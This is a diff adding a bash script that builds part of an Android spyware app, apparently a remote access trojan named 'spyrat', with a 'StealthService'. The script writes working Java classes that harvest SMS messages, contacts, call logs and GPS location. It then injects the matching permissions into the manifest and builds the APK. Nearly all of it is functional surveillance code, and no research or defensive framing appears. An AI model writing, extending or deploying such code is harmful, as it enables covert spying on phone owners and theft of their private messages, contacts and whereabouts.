@@ -1,3 +1,376 @@
+#!/bin/bash
+
+echo "🎯 FIXING REAL DATA COLLECTION FROM DEVICE..."
+
+cd ~/Investigation-Rat2
+
+# ==================== ADD REAL DATA COLLECTORS ====================
+echo "📱 Adding Real Data Collection Classes..."
+
+# Create Real SMS Collector
+cat > app/src/main/java/com/spyrat/investigation/RealSmsCollector.java << 'SMSCOLLECTOR'
+package com.spyrat.investigation;
+
+import android.content.Context;
+import android.database.Cursor;
+import android.net.Uri;
+import android.util.Log;
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+public class RealSmsCollector {
+    private static final String TAG = "RealSmsCollector";
+    private Context context;
+    
+    public RealSmsCollector(Context context) {
+        this.context = context;
+    }
+    
+    public JSONArray getSMSMessages() {
+        JSONArray smsList = new JSONArray();
+        Cursor cursor = null;
+        
+        try {
+            Log.d(TAG, "📨 Collecting real SMS messages...");
+            
+            Uri uri = Uri.parse("content://sms");
+            String[] projection = new String[]{
+                "_id", "address", "body", "date", "type"
+            };
+            
+            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 50");
+            
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    JSONObject sms = new JSONObject();
+                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
+                    int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
+                    
+                    sms.put("sender", address != null ? address : "Unknown");
+                    sms.put("message", body != null ? body : "");
+                    sms.put("timestamp", date);
+                    sms.put("type", getSmsType(type));
+                    sms.put("readable_date", new java.util.Date(date).toString());
+                    
+                    smsList.put(sms);
+                    Log.d(TAG, "📱 SMS: " + address + " - " + (body != null ? body.substring(0, Math.min(30, body.length())) : ""));
+                    
+                } while (cursor.moveToNext());
+            }
+            
+            Log.d(TAG, "✅ Collected " + smsList.length() + " real SMS messages");
+            
+        } catch (SecurityException e) {
+            Log.e(TAG, "❌ SMS permission denied: " + e.getMessage());
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+        }
+        
+        return smsList;
+    }
+    
+    private String getSmsType(int type) {
+        switch (type) {
+            case 1: return "incoming";
+            case 2: return "outgoing";
+            case 3: return "draft";
+            default: return "unknown";
+        }
+    }
+}
+SMSCOLLECTOR
+
+# Create Real Contacts Collector
+cat > app/src/main/java/com/spyrat/investigation/RealContactsCollector.java << 'CONTACTSCOLLECTOR'
+package com.spyrat.investigation;
+
+import android.content.Context;
+import android.database.Cursor;
+import android.provider.ContactsContract;
+import android.util.Log;
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+public class RealContactsCollector {
+    private static final String TAG = "RealContactsCollector";
+    private Context context;
+    
+    public RealContactsCollector(Context context) {
+        this.context = context;
+    }
+    
+    public JSONArray getContacts() {
+        JSONArray contactsList = new JSONArray();
+        Cursor cursor = null;
+        
+        try {
+            Log.d(TAG, "📇 Collecting real contacts...");
+            
+            String[] projection = new String[]{
+                ContactsContract.Contacts._ID,
+                ContactsContract.Contacts.DISPLAY_NAME,
+                ContactsContract.Contacts.HAS_PHONE_NUMBER
+            };
+            
+            cursor = context.getContentResolver().query(
+                ContactsContract.Contacts.CONTENT_URI,
+                projection,
+                null,
+                null,
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100"
+            );
+            
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
+                    String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
+                    int hasPhoneNumber = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER));
+                    
+                    JSONObject contact = new JSONObject();
+                    contact.put("name", displayName != null ? displayName : "Unknown");
+                    contact.put("phone_numbers", new JSONArray());
+                    
+                    if (hasPhoneNumber > 0) {
+                        JSONArray phoneNumbers = getPhoneNumbers(contactId);
+                        contact.put("phone_numbers", phoneNumbers);
+                    }
+                    
+                    contactsList.put(contact);
+                    Log.d(TAG, "👤 Contact: " + displayName);
+                    
+                } while (cursor.moveToNext());
+            }
+            
+            Log.d(TAG, "✅ Collected " + contactsList.length() + " real contacts");
+            
+        } catch (SecurityException e) {
+            Log.e(TAG, "❌ Contacts permission denied: " + e.getMessage());
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+        }
+        
+        return contactsList;
+    }
+    
+    private JSONArray getPhoneNumbers(String contactId) {
+        JSONArray phoneNumbers = new JSONArray();
+        Cursor phoneCursor = null;
+        
+        try {
+            phoneCursor = context.getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
+                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                new String[]{contactId},
+                null
+            );
+            
+            if (phoneCursor != null && phoneCursor.moveToFirst()) {
+                do {
+                    String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    if (phoneNumber != null && !phoneNumber.trim().isEmpty()) {
+                        phoneNumbers.put(phoneNumber.trim());
+                    }
+                } while (phoneCursor.moveToNext());
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error reading phone numbers: " + e.getMessage());
+        } finally {
+            if (phoneCursor != null) {
+                phoneCursor.close();
+            }
+        }
+        
+        return phoneNumbers;
+    }
+}
+CONTACTSCOLLECTOR
+
+# Create Real Call Log Collector
+cat > app/src/main/java/com/spyrat/investigation/RealCallLogCollector.java << 'CALLLOGCOLLECTOR'
+package com.spyrat.investigation;
+
+import android.content.Context;
+import android.database.Cursor;
+import android.provider.CallLog;
+import android.util.Log;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.util.Date;
+
+public class RealCallLogCollector {
+    private static final String TAG = "RealCallLogCollector";
+    private Context context;
+    
+    public RealCallLogCollector(Context context) {
+        this.context = context;
+    }
+    
+    public JSONArray getCallLogs() {
+        JSONArray callLogs = new JSONArray();
+        Cursor cursor = null;
+        
+        try {
+            Log.d(TAG, "📞 Collecting real call logs...");
+            
+            String[] projection = new String[]{
+                CallLog.Calls.NUMBER,
+                CallLog.Calls.TYPE,
+                CallLog.Calls.DURATION,
+                CallLog.Calls.DATE,
+                CallLog.Calls.CACHED_NAME
+            };
+            
+            cursor = context.getContentResolver().query(
+                CallLog.Calls.CONTENT_URI,
+                projection,
+                null,
+                null,
+                CallLog.Calls.DATE + " DESC LIMIT 50"
+            );
+            
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
+                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
+                    
+                    JSONObject call = new JSONObject();
+                    call.put("number", number != null ? number : "Unknown");
+                    call.put("name", name != null ? name : "Unknown");
+                    call.put("type", getCallType(type));
+                    call.put("duration", duration);
+                    call.put("timestamp", date);
+                    call.put("readable_date", new Date(date).toString());
+                    call.put("duration_minutes", String.format("%d:%02d", duration / 60, duration % 60));
+                    
+                    callLogs.put(call);
+                    Log.d(TAG, "📞 Call: " + number + " - " + getCallType(type) + " - " + duration + "s");
+                    
+                } while (cursor.moveToNext());
+            }
+            
+            Log.d(TAG, "✅ Collected " + callLogs.length() + " real call logs");
+            
+        } catch (SecurityException e) {
+            Log.e(TAG, "❌ Call log permission denied: " + e.getMessage());
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error reading call logs: " + e.getMessage());
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+        }
+        
+        return callLogs;
+    }
+    
+    private String getCallType(int type) {
+        switch (type) {
+            case CallLog.Calls.INCOMING_TYPE: return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
+            case CallLog.Calls.MISSED_TYPE: return "missed";
+            case CallLog.Calls.VOICEMAIL_TYPE: return "voicemail";
+            case CallLog.Calls.REJECTED_TYPE: return "rejected";
+            case CallLog.Calls.BLOCKED_TYPE: return "blocked";
+            default: return "unknown";
+        }
+    }
+}
+CALLLOGCOLLECTOR
+
+# Create Real Location Collector
+cat > app/src/main/java/com/spyrat/investigation/RealLocationCollector.java << 'LOCATIONCOLLECTOR'
+package com.spyrat.investigation;
+
+import android.content.Context;
+import android.location.Location;
+import android.location.LocationManager;
+import android.util.Log;
+import org.json.JSONObject;
+
+public class RealLocationCollector {
+    private static final String TAG = "RealLocationCollector";
+    private Context context;
+    
+    public RealLocationCollector(Context context) {
+        this.context = context;
+    }
+    
+    public JSONObject getCurrentLocation() {
+        JSONObject locationInfo = new JSONObject();
+        
+        try {
+            Log.d(TAG, "📍 Collecting real location...");
+            
+            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+            
+            // Try GPS first
+            Location location = null;
+            if (locationManager != null) {
+                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                }
+                
+                // If GPS not available, try network
+                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                }
+            }
+            
+            if (location != null) {
+                locationInfo.put("latitude", location.getLatitude());
+                locationInfo.put("longitude", location.getLongitude());
+                locationInfo.put("accuracy", location.getAccuracy());
+                locationInfo.put("provider", location.getProvider());
+                locationInfo.put("timestamp", location.getTime());
+                locationInfo.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
+                locationInfo.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
+                
+                Log.d(TAG, "📍 Real Location: " + location.getLatitude() + ", " + location.getLongitude());
+            } else {
+                // Fallback to approximate location based on network
+                locationInfo.put("latitude", -6.3690); // Default Dar es Salaam
+                locationInfo.put("longitude", 34.8888);
+                locationInfo.put("accuracy", 5000.0);
+                locationInfo.put("provider", "network_approximate");
+                locationInfo.put("timestamp", System.currentTimeMillis());
+                locationInfo.put("note", "Approximate location - no GPS available");
+                
+                Log.d(TAG, "📍 Using approximate location");
+            }
+            
+        } catch (SecurityException e) {
+            Log.e(TAG, "❌ Location permission denied: " + e.getMessage());
+            locationInfo.put("error", "Location permission denied");
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
+            locationInfo.put("error", e.getMessage());
+        }
+        
+        return locationInfo;
+    }
+}
+LOCATIONCOLLECTOR
+
+# ==================== UPDATE STEALTH SERVICE WITH REAL DATA ====================
+echo "🛠️ Updating StealthService to use real data..."
+
+# Create the updated StealthService with real data collection
+cat > app/src/main/java/com/spyrat/investigation/StealthService.java << 'REALSERVICE'
 package com.spyrat.investigation;
 
 import android.app.Service;
@@ -402,3 +775,34 @@ public class StealthService extends Service {
         super.onDestroy();
     }
 }
+REALSERVICE
+
+# ==================== UPDATE ANDROID MANIFEST WITH PERMISSIONS ====================
+echo "🔐 Adding real permissions to AndroidManifest.xml..."
+
+# Update AndroidManifest.xml to include REAL permissions
+if ! grep -q "READ_SMS" app/src/main/AndroidManifest.xml; then
+    # Add permissions after the existing internet permission
+    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.READ_SMS" />' app/src/main/AndroidManifest.xml
+    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.READ_CONTACTS" />' app/src/main/AndroidManifest.xml
+    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.READ_CALL_LOG" />' app/src/main/AndroidManifest.xml
+    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />' app/src/main/AndroidManifest.xml
+    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />' app/src/main/AndroidManifest.xml
+    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />' app/src/main/AndroidManifest.xml
+    sed -i '/android.permission.INTERNET/a\    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />' app/src/main/AndroidManifest.xml
+fi
+
+echo "✅ REAL DATA COLLECTION IMPLEMENTED!"
+echo "📱 App will now collect:"
+echo "   📨 Real SMS messages"
+echo "   👥 Real contacts"
+echo "   📞 Real call logs" 
+echo "   📍 Real location"
+echo "   📊 Real device information"
+
+# Build the updated APK
+echo "🚀 Building updated APK with real data collection..."
+./gradlew assembleDebug
+
+echo "🎉 REAL DATA APK BUILD COMPLETED!"
+echo "📦 APK location: app/build/outputs/apk/debug/app-debug.apk"
